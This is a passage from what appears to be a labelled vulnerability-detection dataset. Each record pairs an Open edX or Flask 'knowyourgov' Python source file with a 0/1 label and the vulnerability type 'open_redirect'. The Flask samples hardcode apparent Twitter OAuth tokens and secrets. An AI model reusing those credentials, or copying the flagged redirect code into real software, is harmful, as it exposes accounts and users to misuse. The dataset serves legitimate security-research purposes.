disable=translation-of-non-string\n                break\n\n    return context\n\n\ndef _get_form_descriptions(request):\n    \"\"\"Retrieve form descriptions from the user API.\n\n    Arguments:\n        request (HttpRequest): The original request, used to retrieve session info.\n\n    Returns:\n        dict: Keys are 'login', 'registration', and 'password_reset';\n            values are the JSON-serialized form descriptions.\n\n    \"\"\"\n    return {\n        'login': _local_server_get('/user_api/v1/account/login_session/', request.session),\n        'registration': _local_server_get('/user_api/v1/account/registration/', request.session),\n        'password_reset': _local_server_get('/user_api/v1/account/password_reset/', request.session)\n    }\n\n\ndef _local_server_get(url, session):\n    \"\"\"Simulate a server-server GET request for an in-process API.\n\n    Arguments:\n        url (str): The URL of the request (excluding the protocol and domain)\n        session (SessionStore): The session of the original request,\n            used to get past the CSRF checks.\n\n    Returns:\n        str: The content of the response\n\n    \"\"\"\n    # Since the user API is currently run in-process,\n    # we simulate the server-server API call by constructing\n    # our own request object.  We don't need to include much\n    # information in the request except for the session\n    # (to get past through CSRF validation)\n    request = HttpRequest()\n    request.method = \"GET\"\n    request.session = session\n\n    # Call the Django view function, simulating\n    # the server-server API call\n    view, args, kwargs = resolve(url)\n    response = view(request, *args, **kwargs)\n\n    # Return the content of the response\n    return response.content\n\n\ndef _external_auth_intercept(request, mode):\n    \"\"\"Allow external auth to intercept a login/registration request.\n\n    Arguments:\n        request (Request): The original request.\n        mode (str): Either \"login\" or \"register\"\n\n    Returns:\n        Response or None\n\n    \"\"\"\n    if mode == \"login\":\n        return external_auth_login(request)\n    elif mode == \"register\":\n        return external_auth_register(request)\n\n\ndef get_user_orders(user):\n    \"\"\"Given a user, get the detail of all the orders from the Ecommerce service.\n\n    Args:\n        user (User): The user to authenticate as when requesting ecommerce.\n\n    Returns:\n        list of dict, representing orders returned by the Ecommerce service.\n    \"\"\"\n    no_data = []\n    user_orders = []\n    commerce_configuration = CommerceConfiguration.current()\n    user_query = {'username': user.username}\n\n    use_cache = commerce_configuration.is_cache_enabled\n    cache_key = commerce_configuration.CACHE_KEY + '.' + str(user.id) if use_cache else None\n    api = ecommerce_api_client(user)\n    commerce_user_orders = get_edx_api_data(\n        commerce_configuration, 'orders', api=api, querystring=user_query, cache_key=cache_key\n    )\n\n    for order in commerce_user_orders:\n        if order['status'].lower() == 'complete':\n            date_placed = datetime.strptime(order['date_placed'], \"%Y-%m-%dT%H:%M:%SZ\")\n            order_data = {\n                'number': order['number'],\n                'price': order['total_excl_tax'],\n                'order_date': strftime_localized(date_placed, 'SHORT_DATE'),\n                'receipt_url': EcommerceService().get_receipt_page_url(order['number']),\n                'lines': order['lines'],\n            }\n            user_orders.append(order_data)\n\n    return user_orders\n\n\n@login_required\n@require_http_methods(['GET'])\ndef account_settings(request):\n    \"\"\"Render the current user's account settings page.\n\n    Args:\n        request (HttpRequest)\n\n    Returns:\n        HttpResponse: 200 if the page was sent successfully\n        HttpResponse: 302 if not logged in (redirect to login page)\n        HttpResponse: 405 if using an unsupported HTTP method\n\n    Example usage:\n\n        GET /account/settings\n\n    \"\"\"\n    return render_to_response('student_account/account_settings.html', account_settings_context(request))\n\n\n@login_required\n@require_http_methods(['GET'])\ndef finish_auth(request):  # pylint: disable=unused-argument\n    \"\"\" Following logistration (1st or 3rd party), handle any special query string params.\n\n    See FinishAuthView.js for details on the query string params.\n\n    e.g. auto-enroll the user in a course, set email opt-in preference.\n\n    This view just displays a \"Please wait\" message while AJAX calls are made to enroll the\n    user in the course etc. This view is only used if a parameter like \"course_id\" is present\n    during login/registration/third_party_auth. Otherwise, there is no need for it.\n\n    Ideally this view will finish and redirect to the next step before the user even sees it.\n\n    Args:\n        request (HttpRequest)\n\n    Returns:\n        HttpResponse: 200 if the page was sent successfully\n        HttpResponse: 302 if not logged in (redirect to login page)\n        HttpResponse: 405 if using an unsupported HTTP method\n\n    Example usage:\n\n        GET /account/finish_auth/?course_id=course-v1:blah&enrollment_action=enroll\n\n    \"\"\"\n    return render_to_response('student_account/finish_auth.html', {\n        'disable_courseware_js': True,\n        'disable_footer': True,\n    })\n\n\ndef account_settings_context(request):\n    \"\"\" Context for the account settings page.\n\n    Args:\n        request: The request object.\n\n    Returns:\n        dict\n\n    \"\"\"\n    user = request.user\n\n    year_of_birth_options = [(unicode(year), unicode(year)) for year in UserProfile.VALID_YEARS]\n    try:\n        user_orders = get_user_orders(user)\n    except:  # pylint: disable=bare-except\n        log.exception('Error fetching order history from Otto.')\n        # Return empty order list as account settings page expect a list and\n        # it will be broken if exception raised\n        user_orders = []\n\n    context = {\n        'auth': {},\n        'duplicate_provider': None,\n        'nav_hidden': True,\n        'fields': {\n            'country': {\n                'options': list(countries),\n            }, 'gender': {\n                'options': [(choice[0], _(choice[1])) for choice in UserProfile.GENDER_CHOICES],  # pylint: disable=translation-of-non-string\n            }, 'language': {\n                'options': released_languages(),\n            }, 'level_of_education': {\n                'options': [(choice[0], _(choice[1])) for choice in UserProfile.LEVEL_OF_EDUCATION_CHOICES],  # pylint: disable=translation-of-non-string\n            }, 'password': {\n                'url': reverse('password_reset'),\n            }, 'year_of_birth': {\n                'options': year_of_birth_options,\n            }, 'preferred_language': {\n                'options': all_languages(),\n            }, 'time_zone': {\n                'options': TIME_ZONE_CHOICES,\n            }\n        },\n        'platform_name': configuration_helpers.get_value('PLATFORM_NAME', settings.PLATFORM_NAME),\n        'password_reset_support_link': configuration_helpers.get_value(\n            'PASSWORD_RESET_SUPPORT_LINK', settings.PASSWORD_RESET_SUPPORT_LINK\n        ) or settings.SUPPORT_SITE_LINK,\n        'user_accounts_api_url': reverse(\"accounts_api\", kwargs={'username': user.username}),\n        'user_preferences_api_url': reverse('preferences_api', kwargs={'username': user.username}),\n        'disable_courseware_js': True,\n        'show_program_listing': ProgramsApiConfig.is_enabled(),\n        'order_history': user_orders\n    }\n\n    if third_party_auth.is_enabled():\n        # If the account on the third party provider is already connected with another edX account,\n        # we display a message to the user.\n        context['duplicate_provider'] = pipeline.get_duplicate_provider(messages.get_messages(request))\n\n        auth_states = pipeline.get_provider_user_states(user)\n\n        context['auth']['providers'] = [{\n            'id': state.provider.provider_id,\n            'name': state.provider.name,  # The name of the provider e.g. Facebook\n            'connected': state.has_account,  # Whether the user's edX account is connected with the provider.\n            # If the user is not connected, they should be directed to this page to authenticate\n            # with the particular provider, as long as the provider supports initiating a login.\n            'connect_url': pipeline.get_login_url(\n                state.provider.provider_id,\n                pipeline.AUTH_ENTRY_ACCOUNT_SETTINGS,\n                # The url the user should be directed to after the auth process has completed.\n                redirect_url=reverse('account_settings'),\n            ),\n            'accepts_logins': state.provider.accepts_logins,\n            # If the user is connected, sending a POST request to this url removes the connection\n            # information for this provider from their edX account.\n            'disconnect_url': pipeline.get_disconnect_url(state.provider.provider_id, state.association_id),\n            # We only want to include providers if they are either currently available to be logged\n            # in with, or if the user is already authenticated with them.\n        } for state in auth_states if state.provider.display_for_login or state.has_account]\n\n    return context\n/n/n/n", "label": 1, "vtype": "open_redirect"}, {"id": "4475d59ecc0a86316a8db34cfc5be12c6e306be6", "code": "knowyourgov/routes/__init__.py/n/nfrom flask import Flask, url_for, render_template, request, make_response, jsonify, json, Response, redirect\nimport requests\nfrom requests_oauthlib import OAuth1\n\nfrom knowyourgov import app\nfrom knowyourgov.models import Politician\nfrom knowyourgov.scripts import insert_politicians_in_db\nfrom knowyourgov.scripts.scraping import scrapers\n# import errors\n\n\"\"\"Home page\n\"\"\"\n@app.route('/')\ndef homepage():\n  q = Politician.all()\n  q.order('-search_count')\n\n  politicians = []\n\n  count = 0\n  for politician in q:\n    politicians.append(politician)\n    count = count + 1\n    if count == 8:\n      break\n  return render_template('home.html', politicians=politicians)\n\n\"\"\"About Page + Feedback\n\"\"\"\n@app.route('/about')\ndef aboutpage():\n  return render_template('about.html')\n\n\"\"\"Detects Location\n\"\"\"\n@app.route('/getlocation')\ndef currentlocation():\n  return render_template('getlocation.html')\n\n\"\"\"Politician Page\n\"\"\"\n@app.route('/politicians/id/<name>')\ndef politician_page(name):\n  name = name.lower().replace('-',' ')\n  politicians = Politician.all()\n  politicians.filter(\"name =\", name)\n  politician = list(politicians[:1])\n  if politician:\n    politician = politicians[0]\n    # increment search count by one\n    politician.search_count = politician.search_count + 1\n    politician.put()\n    politician.first_name, politician.last_name = politician.name.split(' ')[0:2]\n    return render_template('politician.html', q = name, politician = politician, title = name)\n  else:\n    return render_template('politician_notfound.html', q = name)\n\n\"\"\"Search -> Politician Page\n\"\"\"\n@app.route('/search', methods= ['POST', 'GET'] )\ndef search():\n # query = request.form['q']\n  query = request.args.get('q').lower().replace('-',' ')\n  politicians = Politician.all()\n  politicians.filter(\"name =\", query)\n  politician = list(politicians[:1])\n  if politician:\n    politician = politicians[0]\n    name = query.replace(' ','-')\n    return redirect('/politicians/id/'+name)\n  else:\n    return render_template('politician_notfound.html', q = query)\n\n\n\"\"\"\n   ** Error Handlers **\n   404, 500 and other errors\n\"\"\"\n\n\"\"\" 404 - Page\n\"\"\"\n@app.errorhandler(404)\ndef page_not_found(error):\n  return render_template('404.html'), 404\n\n\"\"\" 500 - Page\n\"\"\"\n@app.errorhandler(500)\ndef page_not_found(error):\n\treturn render_template('500.html'), 500\n\n\n\"\"\"\n   ** JSON response routes **\n\"\"\"\n\n\"\"\"JSON response containing information for a particular politician\n\"\"\"\n@app.route('/json/politicians/<politician>')\ndef json_politician(politician):\n  politicians = Politician.all()\n  politicians.filter(\"name =\", politician.lower())\n  politician = None\n  for p in politicians:\n    politician = p\n  return jsonify(name=politician.name,\n    state = politician.state,\n    party = politician.party,\n    constituency = politician.constituency,\n    wiki = politician.wiki_link,\n    imageUrl = politician.image_url,\n    search_count = politician.search_count\n    )\n\n\"\"\"Politicians from a particular state\n   Format: JSON\n\"\"\"\n@app.route('/json/politicians/state/<state>')\ndef politicians_by_state(state):\n  pols = Politician.all()\n  pols.filter(\"state =\", state.lower())\n  pols.order('-search_count')\n\n  politicians = []\n\n  for pol in pols:\n    politician = {\n      'name': pol.name,\n      'party': pol.party,\n      'state': pol.state,\n      'constituency': pol.constituency,\n      'wiki': pol.wiki_link,\n      'search_count': pol.search_count\n    }\n\n    politicians.append(politician)\n\n  return jsonify(politicians = politicians)\n\n\"\"\"Array of datums for politicians\n   Format: JSON\n\"\"\"\n@app.route('/json/politicians/all')\ndef all_politicians():\n  pols = Politician.all()\n\n  politicians = []\n\n  for pol in pols:\n    tokens = pol.name.title().split(' ')\n    politician = {\n      'value': pol.name.title(),\n      'tokens': tokens,\n      'search_count': pol.search_count\n    }\n\n    politicians.append(politician)\n\n  # create JSON response\n  resp = Response(\n    response=json.dumps(politicians),\n    status=200,\n    mimetype=\"application/json\"\n  )\n\n  return resp\n\n\"\"\"News articles from various news sources\n   Format: JSON\n\"\"\"\n@app.route('/json/<newspaper>/<query>')\ndef test(newspaper, query):\n\thinduscraper = scrapers[newspaper]\n\thinduscraper.getArticleLinks(query)\n\thinduscraper.addArticleContent()\n\tarticles = hinduscraper.getArticles()\n\treturn jsonify(articles=articles)\n\n\"\"\"Tweets for a search query\n   Format: JSON\n\"\"\"\n@app.route('/json/tweets/search/<query>', methods=['GET'])\ndef tweets_search(query):\n  # oauth tokens for Twitter APP\n  access_token = '487593326-yu9WIClcUgs9vBWJGGgW4QC9pKedHMdm3NhhNoxe'\n  access_token_secret = 'fMcsDcqTtbeM73qB7Cxo7dGKhZT9byGh7i5lKjOVscQzP'\n  consumer_key = 'yd6lDwm3Ra9j7djyXHmrg'\n  consumer_secret = 'BlBMf6kP98LwWepOVSypVwDi2x2782P2KQnJQomY'\n\n  oauth = OAuth1(consumer_key,\n    resource_owner_key=access_token,\n    resource_owner_secret=access_token_secret,\n    client_secret=consumer_secret\n    )\n\n  base_url = 'https://api.twitter.com/1.1/'\n  search_url = 'search/tweets.json'\n  verify_url = 'account/verify_credentials.json'\n  payload = {'q': query, 'count': '5', 'lang': 'en', 'result_type': 'mixed'}\n\n  # verify account credentials\n  response = requests.get(base_url + verify_url, auth=oauth)\n  if response.status_code == 200:\n    response = requests.get(base_url + search_url, params=payload, auth=oauth)\n\n    # create JSON response\n    resp = Response(\n      response=response.content,\n      status=200,\n      mimetype=\"application/json\"\n    )\n    \n    return resp\n  else:\n    return jsonify(error=str(response.content))\n\n\"\"\"\n   **Database errands**\n\n\"\"\"\n\n\"\"\"Creates entry for politicians in the db\n    *Note* : Do not run it more than once, will create multiple entries\n\"\"\"\n@app.route('/updatedb/politicians')\ndef update_all():\n  return insert_politicians_in_db()\n/n/n/n", "label": 0, "vtype": "open_redirect"}, {"id": "4475d59ecc0a86316a8db34cfc5be12c6e306be6", "code": "/knowyourgov/routes/__init__.py/n/nfrom flask import Flask, url_for, render_template, request, make_response, jsonify, json, Response\nimport requests\nfrom requests_oauthlib import OAuth1\n\nfrom knowyourgov import app\nfrom knowyourgov.models import Politician\nfrom knowyourgov.scripts import insert_politicians_in_db\nfrom knowyourgov.scripts.scraping import scrapers\n# import errors\n\n\"\"\"Home page\n\"\"\"\n@app.route('/')\ndef homepage():\n  q = Politician.all()\n  q.order('-search_count')\n\n  politicians = []\n\n  count = 0\n  for politician in q:\n    politicians.append(politician)\n    count = count + 1\n    if count == 8:\n      break\n  return render_template('home.html', politicians=politicians)\n\n\"\"\"About Page + Feedback\n\"\"\"\n@app.route('/about')\ndef aboutpage():\n  return render_template('about.html')\n\n\"\"\"Detects Location\n\"\"\"\n@app.route('/getlocation')\ndef currentlocation():\n  return render_template('getlocation.html')\n\n\"\"\"Politician Page\n\"\"\"\n@app.route('/politicians/id/<name>')\ndef politician_page(name):\n  name = name.lower()\n  politicians = Politician.all()\n  politicians.filter(\"name =\", name)\n  politician = None\n  for p in politicians:\n    politician = p\n\n  if politician != None:\n    # increment search count by one\n    politician.search_count = politician.search_count + 1\n    politician.put()\n    return render_template('politician.html', q = name, politician = politician)\n  else:\n    return render_template('politician_notfound.html', q = name)\n\n\"\"\"Search -> Politician Page\n\"\"\"\n@app.route('/search', methods= ['POST', 'GET'] )\ndef search():\n # query = request.form['q']\n  query = request.args.get('q').lower()\n  politicians = Politician.all()\n  politicians.filter(\"name =\", query)\n  politician = None\n  \n  for p in politicians:\n    politician = p\n\n  if politician != None:\n    # increment search count by one\n    politician.search_count = politician.search_count + 1\n    politician.put()\n    return render_template('politician.html', q = query, politician = politician)\n  else:\n    return render_template('politician_notfound.html', q = query)\n\n\n\"\"\"\n   ** Error Handlers **\n   404, 500 and other errors\n\"\"\"\n\n\"\"\" 404 - Page\n\"\"\"\n@app.errorhandler(404)\ndef page_not_found(error):\n  return render_template('404.html'), 404\n\n\"\"\" 500 - Page\n\"\"\"\n@app.errorhandler(500)\ndef page_not_found(error):\n\treturn render_template('500.html'), 500\n\n\n\"\"\"\n   ** JSON response routes **\n\"\"\"\n\n\"\"\"JSON response containing information for a particular politician\n\"\"\"\n@app.route('/json/politicians/<politician>')\ndef json_politician(politician):\n  politicians = Politician.all()\n  politicians.filter(\"name =\", politician.lower())\n  politician = None\n  for p in politicians:\n    politician = p\n  return jsonify(name=politician.name,\n    state = politician.state,\n    party = politician.party,\n    constituency = politician.constituency,\n    wiki = politician.wiki_link,\n    imageUrl = politician.image_url,\n    search_count = politician.search_count\n    )\n\n\"\"\"Politicians from a particular state\n   Format: JSON\n\"\"\"\n@app.route('/json/politicians/state/<state>')\ndef politicians_by_state(state):\n  pols = Politician.all()\n  pols.filter(\"state =\", state.lower())\n  pols.order('-search_count')\n\n  politicians = []\n\n  for pol in pols:\n    politician = {\n      'name': pol.name,\n      'party': pol.party,\n      'state': pol.state,\n      'constituency': pol.constituency,\n      'wiki': pol.wiki_link,\n      'search_count': pol.search_count\n    }\n\n    politicians.append(politician)\n\n  return jsonify(politicians = politicians)\n\n\"\"\"Array of datums for politicians\n   Format: JSON\n\"\"\"\n@app.route('/json/politicians/all')\ndef all_politicians():\n  pols = Politician.all()\n\n  politicians = []\n\n  for pol in pols:\n    tokens = pol.name.title().split(' ')\n    politician = {\n      'value': pol.name.title(),\n      'tokens': tokens,\n      'search_count': pol.search_count\n    }\n\n    politicians.append(politician)\n\n  # create JSON response\n  resp = Response(\n    response=json.dumps(politicians),\n    status=200,\n    mimetype=\"application/json\"\n  )\n\n  return resp\n\n\"\"\"News articles from various news sources\n   Format: JSON\n\"\"\"\n@app.route('/json/<newspaper>/<query>')\ndef test(newspaper, query):\n\thinduscraper = scrapers[newspaper]\n\thinduscraper.getArticleLinks(query)\n\thinduscraper.addArticleContent()\n\tarticles = hinduscraper.getArticles()\n\treturn jsonify(articles=articles)\n\n\"\"\"Tweets for a search query\n   Format: JSON\n\"\"\"\n@app.route('/json/tweets/search/<query>', methods=['GET'])\ndef tweets_search(query):\n  # oauth tokens for Twitter APP\n  access_token = '487593326-yu9WIClcUgs9vBWJGGgW4QC9pKedHMdm3NhhNoxe'\n  access_token_secret = 'fMcsDcqTtbeM73qB7Cxo7dGKhZT9byGh7i5lKjOVscQzP'\n  consumer_key = 'yd6lDwm3Ra9j7djyXHmrg'\n  consumer_secret = 'BlBMf6kP98LwWepOVSypVwDi2x2782P2KQnJQomY'\n\n  oauth = OAuth1(consumer_key,\n    resource_owner_key=access_token,\n    resource_owner_secret=access_token_secret,\n    client_secret=consumer_secret\n    )\n\n  base_url = 'https://api.twitter.com/1.1/'\n  search_url = 'search/tweets.json'\n  verify_url = 'account/verify_credentials.json'\n  payload = {'q': query, 'count': '5', 'lang': 'en', 'result_type': 'mixed'}\n\n  # verify account credentials\n  response = requests.get(base_url + verify_url, auth=oauth)\n  if response.status_code == 200:\n    response = requests.get(base_url + search_url, params=payload, auth=oauth)\n\n    # create JSON response\n    resp = Response(\n      response=response.content,\n      status=200,\n      mimetype=\"application/json\"\n    )\n    \n    return resp\n  else:\n    return jsonify(error=str(response.content))\n\n\"\"\"\n   **Database errands**\n\n\"\"\"\n\n\"\"\"Creates entry for politicians in the db\n    *Note* : Do not run it more than once, will create multiple entries\n\"\"\"\n@app.route('/updatedb/politicians')\ndef update_all():\n  return insert_politicians_in_db()\n/n/n/n", "label": 1, "vtype": "open_redirect"}, {"id": "84c6c5ac27627db8aa829ead02ec98e8afa94b1e", "code": "common/djangoapps/student/helpers.py/n/n\"\"\"Helpers for the student app. \"\"\"\nimport logging\nimport mimetypes\nimport urllib\nimport urlparse\nfrom datetime import datetime\n\nfrom django.conf import settings\nfrom django.core.urlresolvers import NoReverseMatch, reverse\nfrom django.utils import http\nfrom oauth2_provider.models import AccessToken as dot_access_token\nfrom oauth2_provider.models import RefreshToken as dot_refresh_token\nfrom provider.oauth2.models import AccessToken as dop_access_token\nfrom provider.oauth2.models import RefreshToken as dop_refresh_token\nfrom pytz import UTC\n\nimport third_party_auth\nfrom course_modes.models import CourseMode\nfrom lms.djangoapps.verify_student.models import SoftwareSecurePhotoVerification, VerificationDeadline\nfrom openedx.core.djangoapps.site_configuration import helpers as configuration_helpers\nfrom openedx.core.djangoapps.theming.helpers import get_themes\n\n# Enumeration of per-course verification statuses\n# we display on the student dashboard.\nVERIFY_STATUS_NEED_TO_VERIFY = \"verify_need_to_verify\"\nVERIFY_STATUS_SUBMITTED = \"verify_submitted\"\nVERIFY_STATUS_RESUBMITTED = \"re_verify_submitted\"\nVERIFY_STATUS_APPROVED = \"verify_approved\"\nVERIFY_STATUS_MISSED_DEADLINE = \"verify_missed_deadline\"\nVERIFY_STATUS_NEED_TO_REVERIFY = \"verify_need_to_reverify\"\n\nDISABLE_UNENROLL_CERT_STATES = [\n    'generating',\n    'ready',\n]\n\n\nlog = logging.getLogger(__name__)\n\n\ndef check_verify_status_by_course(user, course_enrollments):\n    \"\"\"\n    Determine the per-course verification statuses for a given user.\n\n    The possible statuses are:\n        * VERIFY_STATUS_NEED_TO_VERIFY: The student has not yet submitted photos for verification.\n        * VERIFY_STATUS_SUBMITTED: The student has submitted photos for verification,\n          but has have not yet been approved.\n        * VERIFY_STATUS_RESUBMITTED: The student has re-submitted photos for re-verification while\n          they still have an active but expiring ID verification\n        * VERIFY_STATUS_APPROVED: The student has been successfully verified.\n        * VERIFY_STATUS_MISSED_DEADLINE: The student did not submit photos within the course's deadline.\n        * VERIFY_STATUS_NEED_TO_REVERIFY: The student has an active verification, but it is\n            set to expire before the verification deadline for the course.\n\n    It is is also possible that a course does NOT have a verification status if:\n        * The user is not enrolled in a verified mode, meaning that the user didn't pay.\n        * The course does not offer a verified mode.\n        * The user submitted photos but an error occurred while verifying them.\n        * The user submitted photos but the verification was denied.\n\n    In the last two cases, we rely on messages in the sidebar rather than displaying\n    messages for each course.\n\n    Arguments:\n        user (User): The currently logged-in user.\n        course_enrollments (list[CourseEnrollment]): The courses the user is enrolled in.\n\n    Returns:\n        dict: Mapping of course keys verification status dictionaries.\n            If no verification status is applicable to a course, it will not\n            be included in the dictionary.\n            The dictionaries have these keys:\n                * status (str): One of the enumerated status codes.\n                * days_until_deadline (int): Number of days until the verification deadline.\n                * verification_good_until (str): Date string for the verification expiration date.\n\n    \"\"\"\n    status_by_course = {}\n\n    # Retrieve all verifications for the user, sorted in descending\n    # order by submission datetime\n    verifications = SoftwareSecurePhotoVerification.objects.filter(user=user)\n\n    # Check whether the user has an active or pending verification attempt\n    # To avoid another database hit, we re-use the queryset we have already retrieved.\n    has_active_or_pending = SoftwareSecurePhotoVerification.user_has_valid_or_pending(\n        user, queryset=verifications\n    )\n\n    # Retrieve expiration_datetime of most recent approved verification\n    # To avoid another database hit, we re-use the queryset we have already retrieved.\n    expiration_datetime = SoftwareSecurePhotoVerification.get_expiration_datetime(user, verifications)\n    verification_expiring_soon = SoftwareSecurePhotoVerification.is_verification_expiring_soon(expiration_datetime)\n\n    # Retrieve verification deadlines for the enrolled courses\n    enrolled_course_keys = [enrollment.course_id for enrollment in course_enrollments]\n    course_deadlines = VerificationDeadline.deadlines_for_courses(enrolled_course_keys)\n\n    recent_verification_datetime = None\n\n    for enrollment in course_enrollments:\n\n        # If the user hasn't enrolled as verified, then the course\n        # won't display state related to its verification status.\n        if enrollment.mode in CourseMode.VERIFIED_MODES:\n\n            # Retrieve the verification deadline associated with the course.\n            # This could be None if the course doesn't have a deadline.\n            deadline = course_deadlines.get(enrollment.course_id)\n\n            relevant_verification = SoftwareSecurePhotoVerification.verification_for_datetime(deadline, verifications)\n\n            # Picking the max verification datetime on each iteration only with approved status\n            if relevant_verification is not None and relevant_verification.status == \"approved\":\n                recent_verification_datetime = max(\n                    recent_verification_datetime if recent_verification_datetime is not None\n                    else relevant_verification.expiration_datetime,\n                    relevant_verification.expiration_datetime\n                )\n\n            # By default, don't show any status related to verification\n            status = None\n\n            # Check whether the user was approved or is awaiting approval\n            if relevant_verification is not None:\n                if relevant_verification.status == \"approved\":\n                    if verification_expiring_soon:\n                        status = VERIFY_STATUS_NEED_TO_REVERIFY\n                    else:\n                        status = VERIFY_STATUS_APPROVED\n                elif relevant_verification.status == \"submitted\":\n                    if verification_expiring_soon:\n                        status = VERIFY_STATUS_RESUBMITTED\n                    else:\n                        status = VERIFY_STATUS_SUBMITTED\n\n            # If the user didn't submit at all, then tell them they need to verify\n            # If the deadline has already passed, then tell them they missed it.\n            # If they submitted but something went wrong (error or denied),\n            # then don't show any messaging next to the course, since we already\n            # show messages related to this on the left sidebar.\n            submitted = (\n                relevant_verification is not None and\n                relevant_verification.status not in [\"created\", \"ready\"]\n            )\n            if status is None and not submitted:\n                if deadline is None or deadline > datetime.now(UTC):\n                    if SoftwareSecurePhotoVerification.user_is_verified(user):\n                        if verification_expiring_soon:\n                            # The user has an active verification, but the verification\n                            # is set to expire within \"EXPIRING_SOON_WINDOW\" days (default is 4 weeks).\n                            # Tell the student to reverify.\n                            status = VERIFY_STATUS_NEED_TO_REVERIFY\n                    else:\n                        status = VERIFY_STATUS_NEED_TO_VERIFY\n                else:\n                    # If a user currently has an active or pending verification,\n                    # then they may have submitted an additional attempt after\n                    # the verification deadline passed.  This can occur,\n                    # for example, when the support team asks a student\n                    # to reverify after the deadline so they can receive\n                    # a verified certificate.\n                    # In this case, we still want to show them as \"verified\"\n                    # on the dashboard.\n                    if has_active_or_pending:\n                        status = VERIFY_STATUS_APPROVED\n\n                    # Otherwise, the student missed the deadline, so show\n                    # them as \"honor\" (the kind of certificate they will receive).\n                    else:\n                        status = VERIFY_STATUS_MISSED_DEADLINE\n\n            # Set the status for the course only if we're displaying some kind of message\n            # Otherwise, leave the course out of the dictionary.\n            if status is not None:\n                days_until_deadline = None\n\n                now = datetime.now(UTC)\n                if deadline is not None and deadline > now:\n                    days_until_deadline = (deadline - now).days\n\n                status_by_course[enrollment.course_id] = {\n                    'status': status,\n                    'days_until_deadline': days_until_deadline\n                }\n\n    if recent_verification_datetime:\n        for key, value in status_by_course.iteritems():  # pylint: disable=unused-variable\n            status_by_course[key]['verification_good_until'] = recent_verification_datetime.strftime(\"%m/%d/%Y\")\n\n    return status_by_course\n\n\ndef auth_pipeline_urls(auth_entry, redirect_url=None):\n    \"\"\"Retrieve URLs for each enabled third-party auth provider.\n\n    These URLs are used on the \"sign up\" and \"sign in\" buttons\n    on the login/registration forms to allow users to begin\n    authentication with a third-party provider.\n\n    Optionally, we can redirect the user to an arbitrary\n    url after auth completes successfully.  We use this\n    to redirect the user to a page that required login,\n    or to send users to the payment flow when enrolling\n    in a course.\n\n    Args:\n        auth_entry (string): Either `pipeline.AUTH_ENTRY_LOGIN` or `pipeline.AUTH_ENTRY_REGISTER`\n\n    Keyword Args:\n        redirect_url (unicode): If provided, send users to this URL\n            after they successfully authenticate.\n\n    Returns:\n        dict mapping provider IDs to URLs\n\n    \"\"\"\n    if not third_party_auth.is_enabled():\n        return {}\n\n    return {\n        provider.provider_id: third_party_auth.pipeline.get_login_url(\n            provider.provider_id, auth_entry, redirect_url=redirect_url\n        ) for provider in third_party_auth.provider.Registry.displayed_for_login()\n    }\n\n\n# Query string parameters that can be passed to the \"finish_auth\" view to manage\n# things like auto-enrollment.\nPOST_AUTH_PARAMS = ('course_id', 'enrollment_action', 'course_mode', 'email_opt_in', 'purchase_workflow')\n\n\ndef get_next_url_for_login_page(request):\n    \"\"\"\n    Determine the URL to redirect to following login/registration/third_party_auth\n\n    The user is currently on a login or registration page.\n    If 'course_id' is set, or other POST_AUTH_PARAMS, we will need to send the user to the\n    /account/finish_auth/ view following login, which will take care of auto-enrollment in\n    the specified course.\n\n    Otherwise, we go to the ?next= query param or to the dashboard if nothing else is\n    specified.\n\n    If THIRD_PARTY_AUTH_HINT is set, then `tpa_hint=<hint>` is added as a query parameter.\n    \"\"\"\n    redirect_to = get_redirect_to(request)\n    if not redirect_to:\n        try:\n            redirect_to = reverse('dashboard')\n        except NoReverseMatch:\n            redirect_to = reverse('home')\n\n    if any(param in request.GET for param in POST_AUTH_PARAMS):\n        # Before we redirect to next/dashboard, we need to handle auto-enrollment:\n        params = [(param, request.GET[param]) for param in POST_AUTH_PARAMS if param in request.GET]\n        params.append(('next', redirect_to))  # After auto-enrollment, user will be sent to payment page or to this URL\n        redirect_to = '{}?{}'.format(reverse('finish_auth'), urllib.urlencode(params))\n        # Note: if we are resuming a third party auth pipeline, then the next URL will already\n        # be saved in the session as part of the pipeline state. That URL will take priority\n        # over this one.\n\n    # Append a tpa_hint query parameter, if one is configured\n    tpa_hint = configuration_helpers.get_value(\n        \"THIRD_PARTY_AUTH_HINT\",\n        settings.FEATURES.get(\"THIRD_PARTY_AUTH_HINT\", '')\n    )\n    if tpa_hint:\n        # Don't add tpa_hint if we're already in the TPA pipeline (prevent infinite loop),\n        # and don't overwrite any existing tpa_hint params (allow tpa_hint override).\n        running_pipeline = third_party_auth.pipeline.get(request)\n        (scheme, netloc, path, query, fragment) = list(urlparse.urlsplit(redirect_to))\n        if not running_pipeline and 'tpa_hint' not in query:\n            params = urlparse.parse_qs(query)\n            params['tpa_hint'] = [tpa_hint]\n            query = urllib.urlencode(params, doseq=True)\n            redirect_to = urlparse.urlunsplit((scheme, netloc, path, query, fragment))\n\n    return redirect_to\n\n\ndef get_redirect_to(request):\n    \"\"\"\n    Determine the redirect url and return if safe\n    :argument\n        request: request object\n\n    :returns: redirect url if safe else None\n    \"\"\"\n    redirect_to = request.GET.get('next')\n    header_accept = request.META.get('HTTP_ACCEPT', '')\n\n    # If we get a redirect parameter, make sure it's safe i.e. not redirecting outside our domain.\n    # Also make sure that it is not redirecting to a static asset and redirected page is web page\n    # not a static file. As allowing assets to be pointed to by \"next\" allows 3rd party sites to\n    # get information about a user on edx.org. In any such case drop the parameter.\n    if redirect_to:\n        mime_type, _ = mimetypes.guess_type(redirect_to, strict=False)\n        if not http.is_safe_url(redirect_to):\n            log.warning(\n                u'Unsafe redirect parameter detected after login page: %(redirect_to)r',\n                {\"redirect_to\": redirect_to}\n            )\n            redirect_to = None\n        elif 'text/html' not in header_accept:\n            log.warning(\n                u'Redirect to non html content %(content_type)r detected from %(user_agent)r'\n                u' after login page: %(redirect_to)r',\n                {\n                    \"redirect_to\": redirect_to, \"content_type\": header_accept,\n                    \"user_agent\": request.META.get('HTTP_USER_AGENT', '')\n                }\n            )\n            redirect_to = None\n        elif mime_type:\n            log.warning(\n                u'Redirect to url path with specified filed type %(mime_type)r not allowed: %(redirect_to)r',\n                {\"redirect_to\": redirect_to, \"mime_type\": mime_type}\n            )\n            redirect_to = None\n        elif settings.STATIC_URL in redirect_to:\n            log.warning(\n                u'Redirect to static content detected after login page: %(redirect_to)r',\n                {\"redirect_to\": redirect_to}\n            )\n            redirect_to = None\n        else:\n            themes = get_themes()\n            for theme in themes:\n                if theme.theme_dir_name in redirect_to:\n                    log.warning(\n                        u'Redirect to theme content detected after login page: %(redirect_to)r',\n                        {\"redirect_to\": redirect_to}\n                    )\n                    redirect_to = None\n                    break\n\n    return 